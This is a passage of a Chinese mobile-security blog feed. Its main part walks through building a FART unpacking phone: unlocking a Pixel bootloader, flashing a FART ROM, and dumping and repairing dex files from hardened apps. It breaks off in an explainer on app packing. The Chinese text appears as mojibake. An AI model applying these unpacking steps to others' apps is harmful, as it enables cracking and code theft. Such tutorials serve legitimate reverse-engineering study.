class="line">https://www.hackingarticles.in/android-penetration-testing-frida/</span><br><span class="line">https://frida.re/docs/home/</span><br><span class="line">https://github.com/frida/frida</span><br><span class="line">https://codeshare.frida.re/browse</span><br><span class="line">https://github.com/kaungkhantpy</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-FART è„±å£³æœºåˆ¶ä½œ</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FART%20%E8%84%B1%E5%A3%B3%E6%9C%BA%E5%88%B6%E4%BD%9C/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FART%20%E8%84%B1%E5%A3%B3%E6%9C%BA%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ARTç¯å¢ƒä¸‹åŸºäºä¸»åŠ¨è°ƒç”¨çš„è‡ªåŠ¨åŒ–è„±å£³æ–¹æ¡ˆï¼Œè¯¦ç»†åŸç†å°±ä¸åœ¨è¿™é‡Œé˜è¿°äº†ã€‚æœ¬æ–‡ä¸»è¦å†…å®¹ä¸ºFARTè„±å£³æœºçš„åˆ¶ä½œæµç¨‹ï¼ŒåŸç†è¯·ç§»æ­¥ <a href="https://github.com/hanbinglengyue/FART%E3%80%82">https://github.com/hanbinglengyue/FARTã€‚</a></p><h2 id="äºŒã€è®¾å¤‡ä¿¡æ¯"><a href="#äºŒã€è®¾å¤‡ä¿¡æ¯" class="headerlink" title="äºŒã€è®¾å¤‡ä¿¡æ¯"></a>äºŒã€è®¾å¤‡ä¿¡æ¯</h2><p>è®¾å¤‡ä½¿ç”¨è°·æ­Œ Pixelï¼Œç‰ˆæœ¬ä¿¡æ¯åŠå¤–è§‚å¦‚ä¸‹å›¾</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213135114.jpg" data-caption="å¾®ä¿¡å›¾ç‰‡_20240213135114"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213135114.jpg" alt="å¾®ä¿¡å›¾ç‰‡_20240213135114"></a></p><h2 id="ä¸‰ã€è§£é™¤-BL-é”"><a href="#ä¸‰ã€è§£é™¤-BL-é”" class="headerlink" title="ä¸‰ã€è§£é™¤ BL é”"></a>ä¸‰ã€è§£é™¤ BL é”</h2><p>1ã€ä¸‹è½½ platform-tools å·¥å…·ï¼Œä¸‹è½½åœ°å€ï¼š<code>https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210153146157.png" data-caption="image-20231210153146157"><img src="/../images/mobile/fart/image-20231210153146157.png" alt="image-20231210153146157"></a></p><p>2ã€æ‰‹æœºä½¿ç”¨å…·æœ‰æ•°æ®ä¼ è¾“åŠŸèƒ½çš„ USB æ•°æ®çº¿è¿æ¥ç”µè„‘ï¼Œç„¶åæ‰“å¼€ Pixel å¼€å‘è€…æ¨¡å¼ï¼Œ<code>è®¾ç½®-ã€‹å…³äºæ‰‹æœº-ã€‹è¿ç»­ç‚¹å‡»ç‰ˆæœ¬å·è¿›è¡Œå¼€å‘è€…æ¨¡å¼</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213131540563.png" data-caption="image-20240213131540563"><img src="/../images/mobile/fart/image-20240213131540563.png" alt="image-20240213131540563"></a></p><p>å¼€å¯ USBè°ƒè¯•ï¼Œ<code>è®¾ç½®-ã€‹ç³»ç»Ÿ-ã€‹é«˜çº§-ã€‹å¼€å‘è€…é€‰é¡¹-ã€‹ç‚¹å‡»æ‰“å¼€USBè°ƒè¯•</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132141986.png" data-caption="image-20240213132141986"><img src="/../images/mobile/fart/image-20240213132141986.png" alt="image-20240213132141986"></a></p><p>æ‰“å¼€ OEM è§£é”ï¼Œè¯¥è®¾ç½®ç½‘ç»œéœ€è¦é­”æ³•ï¼Œè‹¥ç½‘ç»œæ²¡æœ‰é­”æ³•åˆ™è¯¥æŒ‰é’®æ˜¾ç¤ºç°è‰²ï¼Œä¸èƒ½æ‰“å¼€ã€‚è¿™ä¸€éƒ¨åˆ†ä¸å¤šé˜è¿°ï¼Œè‡ªè¡Œé­”æ³•ç½‘ç»œï¼ˆç½‘ç»œèƒ½è®¿é—® google å³å¯ï¼‰ï¼Œç„¶åé‡æ–°å›åˆ° <code>è®¾ç½®-ã€‹ç³»ç»Ÿ-ã€‹é«˜çº§-ã€‹å¼€å‘è€…é€‰é¡¹-ã€‹æ‰“å¼€OEMæŒ‰é’®</code>å³å¯ï¼Œå¼€å¯åå¯é€‰æ‹©å…³é—­é­”æ³•ç½‘ç»œã€‚æˆªå›¾å¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213131927904.png" data-caption="image-20240213131927904"><img src="/../images/mobile/fart/image-20240213131927904.png" alt="image-20240213131927904"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132039826.png" data-caption="image-20240213132039826"><img src="/../images/mobile/fart/image-20240213132039826.png" alt="image-20240213132039826"></a></p><p>3ã€å®‰è£…é©±åŠ¨ï¼Œé¦–å…ˆä¸‹è½½ google usb é©±åŠ¨ï¼Œä¸‹è½½åœ°å€ï¼š<code>https://developer.android.com/studio/run/win-usb?hl=zh-cn</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210151052877.png" data-caption="image-20231210151052877"><img src="/../images/mobile/fart/image-20231210151052877.png" alt="image-20231210151052877"></a></p><p>éœ€è¦æ‰‹æœº USB è¿æ¥ç”µè„‘åè¿›å…¥ fastboot æ¨¡å¼ä¸‹æ“ä½œï¼ŒPixel 1 è¿›å…¥ fastboot æ¨¡å¼é‡å¯è®¾å¤‡è¿›å…¥å¼€å¯ç•Œé¢å‰é•¿æŒ‰<code>ç”µæºé”®+éŸ³é‡ä¸‹ </code>ï¼Œç”±ä¸‹å›¾å¯çŸ¥ <code>Device is LOCKED</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132349724.png" data-caption="image-20240213132349724"><img src="/../images/mobile/fart/image-20240213132349724.png" alt="image-20240213132349724"></a></p><p>ç„¶åç”µè„‘ä¸Š <code>Win + x</code> å‘½ä»¤é€‰æ‹© <code>è®¾å¤‡ç®¡ç†å™¨-ã€‹å…¶ä»–è®¾å¤‡-ã€‹Android</code>ï¼Œè¿›è¡Œå®‰è£… google usb é©±åŠ¨</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170018512.png" data-caption="image-20231210170018512"><img src="/../images/mobile/fart/image-20231210170018512.png" alt="image-20231210170018512"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170048384.png" data-caption="image-20231210170048384"><img src="/../images/mobile/fart/image-20231210170048384.png" alt="image-20231210170048384"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170111120.png" data-caption="image-20231210170111120"><img src="/../images/mobile/fart/image-20231210170111120.png" alt="image-20231210170111120"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170152919.png" data-caption="image-20231210170152919"><img src="/../images/mobile/fart/image-20231210170152919.png" alt="image-20231210170152919"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170216431.png" data-caption="image-20231210170216431"><img src="/../images/mobile/fart/image-20231210170216431.png" alt="image-20231210170216431"></a></p><p>å®‰è£…å®Œæˆåï¼ŒéªŒè¯ fastboot æ˜¯å¦è¿æ¥æ­£å¸¸ï¼Œç”µè„‘ platform-tools ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œè‹¥å‡ºç°è®¾å¤‡åç§°å³ fastboot åˆ™è¿æ¥æ­£å¸¸</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot devices</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170326951.png" data-caption="image-20231210170326951"><img src="/../images/mobile/fart/image-20231210170326951.png" alt="image-20231210170326951"></a></p><p>4ã€ç„¶åæ‰§è¡Œå‘½ä»¤è§£é™¤ BL é”ï¼Œè¯¥å‘½ä»¤åœ¨ fastboot æ¨¡å¼ä¸‹æˆ–è€…ç›´æ¥åœ¨  platform-tools ç›®å½•ä¸‹æ‰§è¡Œå‡å¯ï¼Œæœ¬äººæ˜¯åœ¨è¿æ¥ USB æ•°æ®çº¿åï¼Œåœ¨ fastboot æ¨¡å¼ä¸‹æ‰§è¡Œçš„ï¼Œæ‰§è¡Œåæ‰‹æœºä¼šå‡ºç°æç¤ºé€‰æ‹©è§£é™¤ BL çš„æŒ‰é’®ï¼ŒéŸ³é‡é”®é€‰æ‹© Yes ï¼Œç”µæºé”®ç¡®è®¤å³å¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flashing unlock</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132641492.png" data-caption="image-20240213132641492"><img src="/../images/mobile/fart/image-20240213132641492.png" alt="image-20240213132641492"></a></p><p>æ­¤æ—¶å¯ä»¥çœ‹åˆ° fastboot æ¨¡å¼ä¸‹æ”¹ä¸º Device is UNLOCKEDï¼Œå³å·²ç»è§£é”äº†</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213132723.jpg" data-caption="å¾®ä¿¡å›¾ç‰‡_20240213132723"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213132723.jpg" alt="å¾®ä¿¡å›¾ç‰‡_20240213132723"></a></p><h2 id="å››ã€åˆ·å…¥-FART"><a href="#å››ã€åˆ·å…¥-FART" class="headerlink" title="å››ã€åˆ·å…¥ FART"></a>å››ã€åˆ·å…¥ FART</h2><p>1ã€ä¸‹è½½fartåˆ·æœºåŒ…ï¼š<code>https://www.cnblogs.com/r0ysue/p/16791596.html</code></p><p>2ã€é€‰æ‹©åˆ·æœºåŒ…ï¼Œæˆ‘è¿™è¾¹ä½¿ç”¨çš„æ˜¯ Pixel </p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141849469.png" data-caption="image-20231210141849469"><img src="/../images/mobile/fart/image-20231210141849469.png" alt="image-20231210141849469"></a></p><p>å°† image-sailfish-opm1.171019.011.zip è§£å‹è‡³å½“å‰æ–‡ä»¶å¤¹å†…</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210142007934.png" data-caption="image-20231210142007934"><img src="/../images/mobile/fart/image-20231210142007934.png" alt="image-20231210142007934"></a></p><p>3ã€å°† adb ç›®å½•ä¸‹çš„ AdbWinApi.dllã€AdbWinUsbApi.dll æ”¾ç½®ç”µè„‘ C:&#x2F;Windows&#x2F;System ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141749477.png" data-caption="image-20231210141749477"><img src="/../images/mobile/fart/image-20231210141749477.png" alt="image-20231210141749477"></a></p><p>å°† adb.exeã€fastboot.exe æ”¾ç½®ç”µè„‘C:&#x2F;Windows&#x2F;System32 ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141832103.png" data-caption="image-20231210141832103"><img src="/../images/mobile/fart/image-20231210141832103.png" alt="image-20231210141832103"></a></p><p>4ã€ç°åœ¨å°±å¯ä»¥ç›´æ¥å¼€å§‹åˆ·æœºäº†ï¼Œfart åˆ·æœºåŒ…ä¸‹æ‰§è¡Œ,æ­¤æ—¶è®¾å¤‡ä¼šå¤šæ¬¡é‡å¯ï¼Œä½†ä¼šæç¤ºæŠ¥é”™ï¼Œå…ˆå¿½ç•¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash-all.bat </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210171942824.png" data-caption="image-20231210171942824"><img src="/../images/mobile/fart/image-20231210171942824.png" alt="image-20231210171942824"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210171951985.png" data-caption="image-20231210171951985"><img src="/../images/mobile/fart/image-20231210171951985.png" alt="image-20231210171951985"></a></p><p>é‡å¯å¯åŠ¨ç³»ç»Ÿï¼ŒæˆåŠŸåˆ·å…¥ç³»ç»Ÿã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213133012.jpg" data-caption="å¾®ä¿¡å›¾ç‰‡_20240213133012"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213133012.jpg" alt="å¾®ä¿¡å›¾ç‰‡_20240213133012"></a></p><h2 id="äº”ã€è„±å£³"><a href="#äº”ã€è„±å£³" class="headerlink" title="äº”ã€è„±å£³"></a>äº”ã€è„±å£³</h2><p>éªŒè¯æ˜¯å¦èƒ½æ­£å¸¸è„±å£³ï¼Œé¦–å…ˆéœ€è¦é‡æ–°å¼€å¯å¼€å‘è€…æ¨¡å¼ï¼ˆç³»ç»Ÿå¯åœ¨è®¾ç½®é‡Œè‡ªå®šä¹‰é€‰æ‹©ä¸­æ–‡ï¼‰ï¼Œå¼€å¯å¼€å‘è€…æ­¥éª¤ä¸€æ ·ï¼Œè¿™é‡Œä¸é˜è¿°ã€‚æ³¨æ„è¯¥è„±å£³æœºä¼šå°†æ‰€æœ‰å®‰è£…çš„è½¯ä»¶è‡ªåŠ¨è¿›è¡Œè„±å£³å¤„ç†ï¼Œæ‰€ä»¥å½“åˆ·å®Œè¯¥ç³»ç»Ÿåå°±ä¸è¦å½“åšæ­£å¸¸çš„æ‰‹æœºå»ä½¿ç”¨äº†ï¼Œé¿å…æ€§èƒ½æ‹–å®äº†ç³»ç»Ÿè¿è¡Œã€‚</p><p>1ã€éªŒè¯ adb æ˜¯å¦æˆåŠŸè¿æ¥ï¼Œå¦‚å›¾ adb èƒ½æ­£å¸¸ä½¿ç”¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210173952265.png" data-caption="image-20231210173952265"><img src="/../images/mobile/fart/image-20231210173952265.png" alt="image-20231210173952265"></a></p><p>2ã€å®‰è£… appï¼Œå¹¶æˆäºˆ sd å¡è¯»å†™æƒé™(å¦åˆ™dumpä¸‹çš„æ–‡ä»¶æ— æ³•å†™å…¥åˆ°sdcard)</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210175614834-17078024397513.png" data-caption="image-20231210175614834"><img src="/../images/mobile/fart/image-20231210175614834-17078024397513.png" alt="image-20231210175614834"></a></p><p>3ã€åˆ©ç”¨ adb ç›‘æ§ fart çš„è¿è¡Œæ—¥å¿—ï¼Œç„¶åæ‰“å¼€ app è¿è¡Œç„¶åè¿›è¡Œè„±å£³ï¼Œå‡ºç° fart run over è¡¨ç¤º fart æ­£åœ¨è¿è¡Œè„±å£³</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat | grep &quot;fart&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210183127771.png" data-caption="image-20231210183127771"><img src="/../images/mobile/fart/image-20231210183127771.png" alt="image-20231210183127771"></a></p><p>adb shell ï¼Œç„¶åè¿›å…¥ &#x2F;sdcard&#x2F;xxxx ç›®å½•ï¼Œå†è¿›å…¥è„±å£³ app åŒ…ç›®å½•ï¼Œå¯æŸ¥çœ‹åœ¨è¯¥åŒ…ç›®å½•ä¸‹å·²ç»æœ‰ç›¸å½“çš„ dex æ–‡ä»¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210183725547.png" data-caption="image-20231210183725547"><img src="/../images/mobile/fart/image-20231210183725547.png" alt="image-20231210183725547"></a></p><p>ç„¶ååœ¨è¯¥è·¯å¾„ä¸‹å¯ä»¥çœ‹åˆ°æœ‰binã€txtã€dexä¸‰ç§æ–‡ä»¶ã€‚</p><ul><li><p>å¸¦æœ‰ excute å…³é”®å­—çš„ dex æ–‡ä»¶æ˜¯åœ¨ excute è„±å£³ç‚¹è„±ä¸‹æ¥çš„ dex æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ jadx é‡Œé¢æ‰“å¼€è¿™ä¸ª dexã€‚å…³äºè¯¥è„±å£³ç‚¹çš„æ›´å¤šä¿¡æ¯å¯ä»¥çœ‹<a href="https://bbs.kanxue.com/thread-254555.htm">ã€Šæ‹¨äº‘è§æ—¥ï¼šå®‰å“APPè„±å£³çš„æœ¬è´¨ä»¥åŠå¦‚ä½•å¿«é€Ÿå‘ç°ARTä¸‹çš„è„±å£³ç‚¹ã€‹</a>ã€‚</p></li><li><p>å¸¦æœ‰ excute å…³é”®å­—çš„ classlist_execute.txt æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯ dex ä¸­æ‰€æœ‰ç±»çš„ç±»åˆ—è¡¨ï¼Œç±»åæ˜¯ç­¾åå½¢å¼çš„ä»¥Lå¼€å¤´ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªç±»ï¼Œ$ åé¢æ˜¯ç±»ä¸­çš„æ–¹æ³•ã€‚</p></li><li><p>åœ¨ä¿®å¤æ–‡ä»¶çš„é€‰æ‹©ä¸Šï¼Œé¦–å…ˆå…¶å®åªéœ€è¦çœ‹æœ‰ bin å‡½æ•°ä½“æ–‡ä»¶çš„ï¼Œæ²¡æœ‰ bin æ–‡ä»¶çš„ dex æ˜¯å¤„äºä¸åŒ Classloader ä¸­çš„ dexï¼Œé‚£äº›æ˜¯äº›ç³»ç»Ÿåº“æˆ–è€…å£³æœ¬èº«ï¼Œä¸æ˜¯æˆ‘ä»¬å…³å¿ƒçš„å¯¹è±¡ã€‚ï¼ˆä¿®å¤è„šæœ¬åœ°å€ï¼š<a href="https://github.com/hanbinglengyue/FART%EF%BC%89">https://github.com/hanbinglengyue/FARTï¼‰</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fart.py -d xxx.dex -i xxx.bin &gt;&gt; repired.txt</span><br></pre></td></tr></table></figure></div></li><li><p>å¹¶ä¸æ˜¯æ‰€æœ‰dexéƒ½éœ€è¦ä¿®å¤ï¼Œæœ‰binçš„æ‰èƒ½ä¿®å¤ï¼Œå½“dumpå‡ºæ¥çš„æ–¹æ³•ä½“æ˜¯ç©ºçš„æ—¶å€™ï¼Œå¹¶ä¸”æœ‰binæ–‡ä»¶ï¼Œç„¶åæ‰è¦å»ä¿®å¤ï¼Œå¤§éƒ¨åˆ†ä¸éœ€è¦ä¿®å¤ï¼Œç›´æ¥dex</p></li></ul><h2 id="å…­ã€æ³¨æ„äº‹é¡¹"><a href="#å…­ã€æ³¨æ„äº‹é¡¹" class="headerlink" title="å…­ã€æ³¨æ„äº‹é¡¹"></a>å…­ã€æ³¨æ„äº‹é¡¹</h2><h3 id="å¼€å¯-OEM-é”"><a href="#å¼€å¯-OEM-é”" class="headerlink" title="å¼€å¯ OEM é”"></a>å¼€å¯ OEM é”</h3><p>å¼€å¯ OEM é”éœ€è¦é­”æ³•ç½‘ç»œï¼Œåœ¨è¿›è¡Œä»£ç†åï¼Œå…ˆåœ¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ google çœ‹æ˜¯å¦æˆåŠŸå®æ–½é­”æ³•ï¼Œå½“ç½‘ç»œæˆåŠŸé­”æ³•åï¼Œå°±å¯ä»¥åœ¨å¼€å‘è€…é€‰é¡¹ä¸­å¼€å¯ OEM æŒ‰é’®ã€‚ï¼ˆæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå¦‚æœç½‘ç»œæ— è¯¯åä»ç„¶å¼€å¯ä¸äº† OEM ï¼Œè¯·æŸ¥çœ‹ Pixel ç‰ˆæœ¬æ”¯ä¸æ”¯æŒè§£é”ï¼‰</p><h3 id="å®‰è£…-google-usb-é©±åŠ¨"><a href="#å®‰è£…-google-usb-é©±åŠ¨" class="headerlink" title="å®‰è£… google usb é©±åŠ¨"></a>å®‰è£… google usb é©±åŠ¨</h3><p>è¿™è¾¹éœ€è¦åœ¨ fastboot æ¨¡å¼ä¸‹å®‰è£… google usb é©±åŠ¨ï¼Œå¦åˆ™ fastboot æ— æ³•è¯†åˆ«è®¾å¤‡å¯¼è‡´æ— æ³•è¿›è¡Œè§£ BL é”è¿›è€Œæ— æ³•è¿›è¡Œåˆ·æœºã€‚</p><h3 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h3><p>æ³¨æ„è‹¥æ²¡æœ‰è§£ BL æ‰§è¡Œåˆ·æœºå‘½ä»¤åˆ™ä¼šå‡ºç°ä»¥ä¸‹æŠ¥é”™ï¼Œæç¤ºéœ€è¦ <code>Please unlock device to enable this command</code>ï¼Œå³éœ€è¦è§£é™¤ BL é”åå†è¿›è¡Œæ“ä½œ</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170530338.png" data-caption="image-20231210170530338"><img src="/../images/mobile/fart/image-20231210170530338.png" alt="image-20231210170530338"></a></p><h2 id="ä¸ƒã€å‚è€ƒ"><a href="#ä¸ƒã€å‚è€ƒ" class="headerlink" title="ä¸ƒã€å‚è€ƒ"></a>ä¸ƒã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/r0ysue/p/16791596.html</span><br><span class="line">https://blog.csdn.net/nini_boom/article/details/110122880</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·æœº </tag>
            
            <tag> è„±å£³æœº </tag>
            
            <tag> FART </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-Android APP åŠ å›ºå£³åŸç†</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Android%20APP%20%E5%8A%A0%E5%9B%BA%E5%A3%B3%E5%8E%9F%E7%90%86/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Android%20APP%20%E5%8A%A0%E5%9B%BA%E5%A3%B3%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ä¸ºäº†ä¿æŠ¤åº”ç”¨åŠä»£ç çš„å®‰å…¨æ€§ï¼Œå¼€å‘è€…å‡ºå‚å‰ä¼šé’ˆå¯¹å®‰å“ APP è¿›è¡ŒåŠ å›ºå¤„ç†ï¼Œé˜²èŒƒæ½œåœ¨é£é™©ã€‚ä¸€èˆ¬é€šè¿‡æ··æ·†ä»£ç ã€åè°ƒè¯•ã€é˜»æ­¢åç¼–è¯‘ã€ä¿æŠ¤å†…å­˜ã€åŠ å¯†æ•°æ®å’ŒéªŒè¯ç­¾åç­‰æ‰‹æ®µï¼Œå…¶ä¸­ä»£ç æ··æ·†å’ŒåŠ å›ºæœ€ä¸ºå¸¸è§ã€‚</p><h3 id="ä»£ç æ··æ·†"><a href="#ä»£ç æ··æ·†" class="headerlink" title="ä»£ç æ··æ·†"></a>ä»£ç æ··æ·†</h3><p>ä»£ç æ··æ·†ï¼ˆCode Obfuscationï¼‰ï¼šé€šè¿‡å¯¹åº”ç”¨ç¨‹åºçš„ä»£ç è¿›è¡Œæ··æ·†ï¼Œå³é‡å‘½åç±»ã€æ–¹æ³•ã€å˜é‡ç­‰æ ‡è¯†ç¬¦ï¼Œå¹¶æ·»åŠ æ— æ•ˆä»£ç æˆ–æ§åˆ¶æµç¨‹çš„æ”¹å˜ï¼Œæ¥å¢åŠ é€†å‘å·¥ç¨‹çš„éš¾åº¦ã€‚å¸¸è§çš„ä»£ç æ··æ·†å·¥å…·åŒ…æ‹¬ ProGuard å’Œ DexGuardã€‚</p><h3 id="åŠ å£³"><a href="#åŠ å£³" class="headerlink" title="åŠ å£³"></a>åŠ å£³</h3><p>åŠ å£³ï¼šé€šè¿‡åœ¨ APK æ–‡ä»¶çš„å¤–å±‚æ·»åŠ ä¸€å±‚å£³æˆ–ä¿æŠ¤å±‚ï¼Œæ¥ä¿æŠ¤åº”ç”¨ç¨‹åºçš„ä»£ç å’Œæ•°æ®ã€‚è¿™å±‚å£³å¯ä»¥åŒ…å«å„ç§å®‰å…¨æªæ–½å’ŒæŠ€æœ¯ï¼Œå¦‚åŠ å¯†ã€åè°ƒè¯•ã€é˜²ç¯¡æ”¹ã€è¿è¡Œæ—¶è§£å¯†ç­‰ã€‚å®ƒçš„ä½œç”¨æ˜¯å¢åŠ åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ï¼Œé˜²æ­¢é€†å‘å·¥ç¨‹å’Œç ´è§£è¡Œä¸ºã€‚å³ä½¿åº”ç”¨ç¨‹åºè¢«åç¼–è¯‘ï¼Œåªèƒ½çœ‹åˆ°å¤–å±‚å£³çš„ä»£ç ï¼Œè€Œæ— æ³•ç›´æ¥è®¿é—®å†…éƒ¨çš„å…³é”®ä»£ç å’Œæ•°æ®ï¼Œä»è€Œæé«˜äº†åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p><hr><h2 id="äºŒã€åŠ å›ºå£³å²"><a href="#äºŒã€åŠ å›ºå£³å²" class="headerlink" title="äºŒã€åŠ å›ºå£³å²"></a>äºŒã€åŠ å›ºå£³å²</h2><h3 id="ç¬¬ä¸€ä»£åŠ å›ºå£³"><a href="#ç¬¬ä¸€ä»£åŠ å›ºå£³" class="headerlink" title="ç¬¬ä¸€ä»£åŠ å›ºå£³"></a>ç¬¬ä¸€ä»£åŠ å›ºå£³</h3><h4 id="DEXåŠ å¯†-è½åœ°åŠ è½½"><a href="#DEXåŠ å¯†-è½åœ°åŠ è½½" class="headerlink" title="DEXåŠ å¯†(è½åœ°åŠ è½½)"></a>DEXåŠ å¯†(è½åœ°åŠ è½½)</h4><p>DEX æ˜¯ Dalvik Executable çš„ç¼©å†™ï¼Œæ˜¯ Android æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ç§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚å®ƒåŒ…å«äº†åº”ç”¨çš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œç”¨äºåœ¨ Dalvik è™šæ‹Ÿæœºä¸­è¿è¡Œåº”ç”¨ï¼ŒDalvikè™šæ‹Ÿæœºå°†æ¯ä¸ªåº”ç”¨ç¨‹åºçš„å­—èŠ‚ç ï¼ˆç¼–è¯‘åçš„.dexæ–‡ä»¶ï¼‰è½¬æ¢ä¸ºDalvikå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.dexæ–‡ä»¶ï¼‰ã€‚DEX æ–‡ä»¶å¯ä»¥é€šè¿‡åç¼–è¯‘å·¥å…·è¢«è½¬æ¢ä¸º Java ä»£ç ï¼Œå› æ­¤åŠ å¯†å’Œä¿æŠ¤ DEX æ–‡ä»¶å¯ä»¥æœ‰æ•ˆé˜²æ­¢åº”ç”¨è¢«åç¼–è¯‘ã€‚å¸¸è§åŠ å›ºæ‰‹æ®µå¦‚ä¸‹ï¼š</p><ul><li><p><strong>Dex å­—ç¬¦ä¸²åŠ 